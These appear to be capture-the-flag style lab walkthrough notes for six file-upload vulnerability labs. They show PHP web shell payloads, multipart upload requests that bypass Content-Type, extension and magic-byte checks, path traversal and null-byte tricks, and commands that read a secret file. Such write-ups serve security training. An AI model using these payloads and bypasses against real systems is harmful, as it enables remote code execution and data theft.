# Navigation
- [Remote code execution via web shell upload](#remote-code-execution-via-web-shell-upload)
- [Web shell upload via Content-Type restriction bypass](#web-shell-upload-via-content-type-restriction-bypass)
- [Web shell upload via path traversal](#web-shell-upload-via-path-traversal)
- [Web shell upload via extension blacklist bypass](#web-shell-upload-via-extension-blacklist-bypass)
- [Web shell upload via obfuscated file extension](#web-shell-upload-via-obfuscated-file-extension)
- [Remote code execution via polyglot web shell upload](#remote-code-execution-via-polyglot-web-shell-upload)
# Remote code execution via web shell upload
1. Authenticate
2. Upload profile picture
3. Response discloses file is uploaded to `/avatars` directory and does not change the filename
4. On account page inspect element of profile picture and path to uploaded file is disclosed `/files/avatars/<file_name>`
	- Directly accessing the file shows the contents of the file
5. Text `php` code execution by uploading a file `<something>.php` and execute the `hostname` command
```php
<?php system('hostname'); ?>
```
6. Accessing the file returns the hostname
7. Write a web shell to the target
```php
<?php system($_GET['cmd']); ?>
```
8. Confirm code execution
```
GET /files/avatars/shell.php?cmd=id
```
9. Web shell works > Read `/home/carlos/secret`
# Web shell upload via Content-Type restriction bypass
1. Authenticate
2. Upload profile picture
3. Probe upload returns error message saying on `image/jpeg` and `image/png` are allowed
```
Sorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```
4. Intercept request when uploading file to test bypass changing content type
```
POST /my-account/avatar
...<SNIP>...
Content-Disposition: form-data; name="avatar"; filename="hostname.php"
Content-Type: image/jpeg

<?php system('id'); ?>
...<SNIP>...
```
5. Account page discloses upload directory and accessing the file directly shows code execution
6. Write a web shell
```php
<?php system($_GET['cmd']); ?>
```
7. Read secret file
```
GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret
```
# Web shell upload via path traversal
1. Authenticate > Upload profile picture
2. Uploading probe `php` file like normal goes to directory `/files/avatars/probe.php`
3. Directory does not execute the code even though we have uploaded it
4. Test directory traversal in the filename when uploading
```
filename="<@urlencode>../</@urlencode>probe.php"
```
- Hackvertor extension URL encoding above ^^^^
5. Response from server tells us the file was uploaded with the directory traversal in file name
```
The file avatars/../probe.php has been uploaded.
```
6. Accessing file `/files/probe.php` indicates code is executed
7. Upload web shell
8. Read secret file
```
GET /files/shell.php?cmd=cat+/home/carlos/secret
```
# Web shell upload via extension blacklist bypass
1. Authenticate > Upload profile picture
2. Uploading probe `php` file tells us `php` is not an allowed file extension
3. Upload alternative `php` file types e.g. `phar`
```
POST /my-account/avatar
...<SNIP>...
filename="shell.phar"
Content-Type: application/x-httpd-php

<?php system($_GET['cmd']); ?>
...<SNIP>...
```
4. Access uploaded shell and confirm code execution
5. Read secret file
```
GET /files/avatars/shell.phar?cmd=cat+/home/carlos/secret
```
# Web shell upload via obfuscated file extension
1. Authenticate > Upload profile picture
2. Uploading probing file tells us only files with `jpg` and `png` extensions are allowed
3. Upload file with special character injected in file name
```
POST /my-account/avatar
...<SNIP>...
filename="shell.php%00.jpg"
Content-Type: application/x-httpd-php

<?php system($_GET['cmd']); ?>
...<SNIP>...
```
4. Access uploaded shell and confirm code execution
5. Read secret file
```
GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret
```
# Remote code execution via polyglot web shell upload
1. Authenticate > Upload profile picture
2. Uploading probe `php` file tells us the file is not a valid image
3. Fuzz the magic bytes allowed using [my list](https://raw.githubusercontent.com/MINEGOBLIN/wordlists/refs/heads/main/File%20upload/magicbytes.list)
4. Successful upload using the following GIF magic bytes
```
Content-Disposition: form-data; name="avatar"; filename="file_example_JPG_100kB.jpg"
Content-Type: image/jpeg

GIF87a  <br>GIF89a
```
5. Upload a web shell with the magic bytes
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

GIF87a  <br>GIF89a
<?php system($_GET['cmd']); ?>
```
6. Confirm code execution and read secret file
```
GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret
```